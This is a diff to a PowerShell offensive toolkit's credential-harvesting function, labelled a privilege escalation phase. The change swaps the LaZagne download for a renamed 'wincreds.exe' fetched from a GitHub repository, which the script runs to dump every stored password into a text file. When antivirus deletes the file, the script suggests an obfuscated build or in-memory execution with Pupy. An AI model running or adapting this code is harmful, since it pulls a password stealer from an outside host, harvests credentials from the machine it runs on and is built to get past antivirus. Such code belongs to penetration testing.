@@ -1185,16 +1185,17 @@ function lazagnemodule
     #Privilege Escalation Phase
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     pathcheck
-    Invoke-WebRequest -Uri 'https://github.com/AlessandroZ/LaZagne/releases/download/2.3.1/Windows.zip' -Outfile $currentPath\Lazagne.zip
-    Unzip "$currentPath\Lazagne.zip" "$currentPath\Lazagne"
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    Invoke-WebRequest -Uri 'https://github.com/SecureThisShit/Creds/blob/master/exeFiles/wincreds.exe?raw=true' -Outfile $currentPath\WinCreds.exe
     Write-Host -ForegroundColor Yellow 'Checking, if the file was killed by antivirus:'
-    if (Test-Path $currentPath\Lazagne\Windows\laZagne.exe)
+    if (Test-Path $currentPath\WinCreds.exe)
     {
         Write-Host -ForegroundColor Yellow 'Not killed, Executing:'
-        "$currentPath\Lazagne\Windows\laZagne.exe all" >> $currentPath\Lazagne\Passwords.txt
+	mkdir $currentPath\Lazagne
+        "$currentPath\WinCreds.exe all" >> $currentPath\Lazagne\Passwords.txt
         Write-Host -ForegroundColor Yellow 'Results saved to $currentPath\Lazagne\Passwords.txt!'
     }
-    else {Write-Host -ForegroundColor Red 'Antivirus got it, try an obfuscated version or RAM-Execution with Pupy:'}
+    else {Write-Host -ForegroundColor Red 'Antivirus got it, try an obfuscated version or In memory execution with Pupy:'}
 }
 
 function latmov
